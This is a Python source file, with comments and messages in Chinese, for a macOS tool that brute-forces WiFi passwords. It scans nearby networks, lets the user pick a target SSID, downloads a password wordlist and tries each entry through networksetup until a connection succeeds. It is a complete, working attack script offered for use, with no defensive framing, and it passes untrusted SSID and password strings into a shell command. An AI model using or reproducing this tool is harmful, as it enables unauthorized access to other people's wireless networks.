#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
import argparse
import requests
from pathlib import Path
from wifi import Cell, Scheme, exceptions
from config import *
import subprocess
import json
import traceback
import time
import threading
from queue import Queue
import concurrent.futures

class WifiBruteforcer:
	def __init__(self, interface='wlan0', update_wordlist=False, target_ssid=None, password_file=None):
		self.interface = interface
		self.target_ssid = target_ssid
		self.password_file = password_file
		if update_wordlist:
			self.update_password_list()
		self.passwords = self.load_passwords()
		
	def update_password_list(self):
		"""从网络更新密码字典"""
		print("[*] 正在从GitHub下载密码字典...")
		try:
			# 确保目录存在
			Path(os.path.dirname(LOCAL_WORDLIST_PATH)).mkdir(parents=True, exist_ok=True)
			
			response = requests.get(DEFAULT_WORDLIST_URL)
			response.raise_for_status()  # 检查响应状态
			
			with open(LOCAL_WORDLIST_PATH, 'wb') as f:
				f.write(response.content)
			print("[+] 密码字典更新成功！")
		except Exception as e:
			print(f"[-] 更新密码字典失败: {str(e)}")
			sys.exit(1)

	def is_valid_password(self, password):
		"""检查密码是否符合WiFi密码规则"""
		# 1. 长度检查 (8-63字符)
		if not (8 <= len(password) <= 63):
			return False
		
		# 2. 字符检查 (只允许ASCII可打印字符)
		if not all(32 <= ord(c) <= 126 for c in password):
			return False
		
		# 3. 不允许纯空格
		if password.isspace():
			return False
		
		# 4. 去除首尾空格后长度仍需符合要求
		stripped = password.strip()
		if not (8 <= len(stripped) <= 63):
			return False
		
		return True

	def load_passwords(self):
		"""加载并优化密码字典"""
		try:
			print("[*] 开始加载密码字典...")
			# 确保 wordlists 目录存在
			os.makedirs('wordlists', exist_ok=True)
			
			# 如果指定了自定义密码文件，优先使用它
			if hasattr(self, 'password_file') and self.password_file:
				print(f"[*] 使用自定义密码文件: {self.password_file}")
				# 如果密码文件不在 wordlists 目录下，复制一份过去
				if not self.password_file.startswith('wordlists/'):
					filename = os.path.basename(self.password_file)
					new_path = os.path.join('wordlists', filename)
					try:
						print(f"[*] 复制密码文件到: {new_path}")
						with open(self.password_file, 'r', encoding='utf-8') as src:
							with open(new_path, 'w', encoding='utf-8') as dst:
									dst.write(src.read())
						self.password_file = new_path
						print(f"[+] 密码文件复制成功")
					except Exception as e:
						print(f"[-] 复制密码文件失败: {str(e)}")
						sys.exit(1)
				
				with open(self.password_file, 'r', encoding='utf-8') as f:
					passwords = [line.strip() for line in f if line.strip()]
					print(f"[*] 从文件加载了 {len(passwords)} 个密码")
			else:
				print("[*] 使用默认密码字典")
				if not os.path.exists(LOCAL_WORDLIST_PATH):
					print("[!] 本地密码字典不存在，正在下载...")
					self.update_password_list()
				
				with open(LOCAL_WORDLIST_PATH, 'r', encoding='utf-8') as f:
					passwords = [line.strip() for line in f if line.strip()]
					print(f"[*] 从默认字典加载了 {len(passwords)} 个密码")

			# 优化密码列表
			print("[*] 正在优化密码列表...")
			original_count = len(passwords)
			
			# 1. 去除重复
			passwords = list(dict.fromkeys(passwords))
			print(f"[*] 去重后的密码数量: {len(passwords)}")
			
			# 2. 按长度排序（先尝试短密码）
			passwords.sort(key=len)
			
			# 3. 过滤无效密码
			valid_passwords = []
			invalid_reasons = {
				'too_short': 0,
				'too_long': 0,
				'invalid_chars': 0,
				'whitespace': 0
			}
			
			for p in passwords:
				if len(p) < 8:
					invalid_reasons['too_short'] += 1
				elif len(p) > 63:
					invalid_reasons['too_long'] += 1
				elif p.isspace():
					invalid_reasons['whitespace'] += 1
				elif not all(32 <= ord(c) <= 126 for c in p):
					invalid_reasons['invalid_chars'] += 1
				else:
					valid_passwords.append(p)
			
			print(f"[*] 密码验证结果:")
			print(f"    - 密码太短 (<8): {invalid_reasons['too_short']}")
			print(f"    - 密码太长 (>63): {invalid_reasons['too_long']}")
			print(f"    - 包含无效字符: {invalid_reasons['invalid_chars']}")
			print(f"    - 纯空格密码: {invalid_reasons['whitespace']}")
			print(f"[*] 优化后的密码数量: {len(valid_passwords)} (去除了 {original_count - len(valid_passwords)} 个无效密码)")

			return valid_passwords
		except Exception as e:
			print(f"[-] 加载密码字典失败: {str(e)}")
			print(f"[-] 错误详情: {traceback.format_exc()}")
			sys.exit(1)

	def scan_networks(self):
		"""扫描可用的WiFi网络 (macOS版本)"""
		try:
			print("[*] 扫描WiFi网络...")
			cmd = 'system_profiler SPAirPortDataType -json'
			result = subprocess.run(cmd.split(), capture_output=True, text=True)
			
			if result.returncode != 0:
				print("[-] 扫描失败，请确保有正确的权限")
				sys.exit(1)

			# 解析JSON输出
			try:
				data = json.loads(result.stdout)
				# 获取WiFi接口信息
				airport_info = data.get('SPAirPortDataType', [{}])[0]
				interfaces = airport_info.get('spairport_airport_interfaces', [])
				
				# 获取en0接口信息
				wifi_info = None
				for interface in interfaces:
					if interface.get('_name') == 'en0':
						wifi_info = interface
						break
				
				if not wifi_info:
					print("[-] 未找到WiFi接口")
					sys.exit(1)
				
				# 获取当前连接的网络
				current_network = wifi_info.get('spairport_current_network_information', {}).get('_name')
				
				# 获取其他可用网络
				networks = []
				seen_ssids = set()  # 用于去重
				
				other_networks = wifi_info.get('spairport_airport_other_local_wireless_networks', [])
				for network in other_networks:
					ssid = network.get('_name')
					if not ssid or ssid == current_network or ssid in seen_ssids:
						continue
					
					seen_ssids.add(ssid)
					
					# 解析信号强度
					signal_noise = network.get('spairport_signal_noise', '')
					signal = signal_noise.split('/')[0].strip() if signal_noise else 'Unknown'
					
					# 解析信道信息
					channel = network.get('spairport_network_channel', '')
					channel = channel.split()[0] if channel else 'Unknown'
					
					# 解析加密类型
					security = network.get('spairport_security_mode', '')
					security = security.replace('spairport_security_mode_', '')
					
					networks.append({
						'ssid': ssid,
						'signal': signal,
						'channel': channel,
						'security': security
					})

				if not networks:
					print("[-] 未找到任何其他WiFi网络")
					sys.exit(1)

				# 按信号强度排序（去掉 dBm 后转为数字进行比较）
				networks.sort(key=lambda x: int(x['signal'].replace(' dBm', '')) if x['signal'] != 'Unknown' else -999, reverse=True)
				
				return networks
				
			except json.JSONDecodeError as e:
				print(f"[-] 无法解析网络信息: {str(e)}")
				sys.exit(1)
				
		except Exception as e:
			print(f"[-] 扫描网络失败: {str(e)}")
			print(f"[-] 错误详情: {result.stderr if 'result' in locals() else '未知错误'}")
			sys.exit(1)

	def try_connect(self, network, password):
		"""尝试连接指定的WiFi网络 (macOS版本)"""
		try:
			# 尝试连接
			cmd = f"networksetup -setairportnetwork en0 '{network['ssid']}' '{password}'"
			result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
			
			if result.returncode != 0:
				return False
			
			# 快速验证连接（减少等待时间）
			time.sleep(0.5)  # 只等待0.5秒
			
			# 验证连接
			verify_cmd = "networksetup -getairportnetwork en0"
			verify_result = subprocess.run(verify_cmd.split(), capture_output=True, text=True, timeout=2)
			
			if network['ssid'] in verify_result.stdout:
				# 如果SSID匹配，再进行一次快速的连通性测试
				test_cmd = "ping -c 1 -t 1 8.8.8.8"  # 只ping一次，超时1秒
				test_result = subprocess.run(test_cmd.split(), capture_output=True)
				return test_result.returncode == 0
				
			# 如果验证失败，快速断开
			subprocess.run(["networksetup", "-setairportpower", "en0", "off"], timeout=1)
			subprocess.run(["networksetup", "-setairportpower", "en0", "on"], timeout=1)
			
			return False
			
		except subprocess.TimeoutExpired:
			# 超时时重置网卡
			try:
				subprocess.run(["networksetup", "-setairportpower", "en0", "off"], timeout=1)
				subprocess.run(["networksetup", "-setairportpower", "en0", "on"], timeout=1)
			except:
				pass
			return False
		except Exception as e:
			print(f"[-] 连接错误: {str(e)}")
			return False

	def list_networks(self):
		"""列出所有可用的WiFi网络 (macOS版本)"""
		networks = self.scan_networks()
		
		# 计算最长SSID长度
		max_ssid_len = max(len(network['ssid']) for network in networks)
		ssid_width = max(20, max_ssid_len + 2)
		
		print("\n可用的WiFi网络:")
		line_width = ssid_width + 55  # 调整总宽度
		print("-" * line_width)
		
		# 表头
		header = (
			f"{'序号':^6} | "
			f"{'SSID':^{ssid_width}} | "
			f"{'信号强度':^10} | "
			f"{'信道':^8} | "
			f"{'加密类型':^12}"
		)
		print(header)
		print("-" * line_width)
		
		# 网络列表
		for idx, network in enumerate(networks, 1):
			line = (
				f"{idx:^6} | "
				f"{network['ssid']:<{ssid_width}} | "
				f"{network['signal']:^10} | "
				f"{network['channel']:^8} | "
				f"{network['security']:^12}"
			)
			print(line)
		
		print("-" * line_width)
		return networks

	def select_network(self):
		"""让用户选择要破解的网络"""
		networks = self.list_networks()
		while True:
			try:
				choice = input("\n请选择要破解的网络序号 (q 退出): ")
				if choice.lower() == 'q':
					sys.exit(0)
				choice = int(choice)
				if 1 <= choice <= len(networks):
					return [networks[choice-1]]
				print("[-] 无效的选择，请重试")
			except ValueError:
				print("[-] 请输入有效的数字")

	def start(self):
		"""开始破解过程"""
		print("[*] 开始破解...")
		
		if self.target_ssid:
			print(f"[*] 正在搜索目标网络: {self.target_ssid}")
			networks = [net for net in self.scan_networks() if net['ssid'] == self.target_ssid]
			if not networks:
				print(f"[-] 未找到目标网络: {self.target_ssid}")
				return False
			print(f"[+] 找到目标网络")
		else:
			networks = self.select_network()

		print(f"[*] 正在加载密码...")
		if not self.passwords:
			print("[-] 密码列表为空")
			return False
		
		nb_loops = len(self.passwords) * len(networks)
		print(f"\n[*] 载入 {len(self.passwords)} 个密码")
		print(f"[*] 总共需要尝试 {nb_loops} 次")

		try:
			for network in networks:
				print(f"\n[*] 尝试破解网络: {network['ssid']} ({network['security']})")
				print(f"[*] 信号强度: {network['signal']}")
				print(f"[*] 信道: {network['channel']}")
				
				print("[*] 确保网卡开启...")
				subprocess.run(["networksetup", "-setairportpower", "en0", "on"])
				
				nb_test = 0
				for password in self.passwords:
					nb_test += 1
					sys.stdout.write(f'\r[*] 进度: {nb_test}/{nb_loops} - 当前密码: {password}')
					sys.stdout.flush()

					if self.try_connect(network, password):
						print(f"\n[+] 成功破解! 网络: {network['ssid']}, 密码: {password}")
						return True

				print(f"\n[-] 未能破解网络: {network['ssid']}")
			
		except KeyboardInterrupt:
			print("\n[!] 用户中断操作")
		except Exception as e:
			print(f"\n[-] 发生错误: {str(e)}")
			print(f"[-] 错误详情: {traceback.format_exc()}")
		finally:
			print("\n[*] 正在恢复网卡状态...")
			try:
				subprocess.run(["networksetup", "-setairportpower", "en0", "on"])
			except:
				pass
		
		return False
		

def main():
	parser = argparse.ArgumentParser(description='WiFi密码破解工具')
	parser.add_argument('-i', '--interface', default=DEFAULT_INTERFACE,
						help='网络接口名称 (默认: en0)')
	parser.add_argument('-u', '--update', action='store_true',
						help='更新密码字典')
	parser.add_argument('-s', '--ssid',
						help='指定要破解的WiFi名称')
	parser.add_argument('-l', '--list', action='store_true',
						help='列出可用的WiFi网络')
	parser.add_argument('-p', '--password-file',
						help='指定自定义的密码字典文件路径')
	
	args = parser.parse_args()
	
	bruteforcer = WifiBruteforcer(
		interface=args.interface,
		update_wordlist=args.update,
		target_ssid=args.ssid,
		password_file=args.password_file
	)

	if args.list:
		bruteforcer.list_networks()
		sys.exit(0)
	
	bruteforcer.start()

if __name__ == "__main__":
	if os.geteuid() != 0:
		print("[-] 此程序需要root权限运行！")
		sys.exit(1)
	main()
		
